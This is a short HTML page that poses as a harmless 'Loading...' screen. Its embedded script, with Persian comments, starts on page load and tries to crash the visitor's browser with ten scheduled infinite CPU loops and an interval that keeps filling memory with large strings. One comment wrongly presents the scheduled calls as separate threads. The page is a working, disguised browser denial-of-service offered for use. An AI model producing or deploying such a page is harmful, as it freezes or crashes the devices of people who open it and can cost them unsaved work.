<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <script>
        // ۱. حلقه بی‌نهایت (CPU رو ۱۰۰٪ میکنه)
        function crash() {
            while (true) {
                // کار بی‌معنی که پردازنده رو مشغول کنه
                Math.random() * Math.random();
            }
        }
        
        // ۲. اجرا با چندین ترد (برای سرعت بیشتر)
        for (let i = 0; i < 10; i++) {
            setTimeout(crash, 0);
        }
        
        // ۳. پر کردن حافظه (برای کرش کردن)
        let data = [];
        setInterval(() => {
            data.push(new Array(1000000).join("A"));
        }, 10);
    </script>
</head>
<body style="background:white; color:black; text-align:center; padding-top:50%;">
    <h1>Loading...</h1>
</body>
</html>
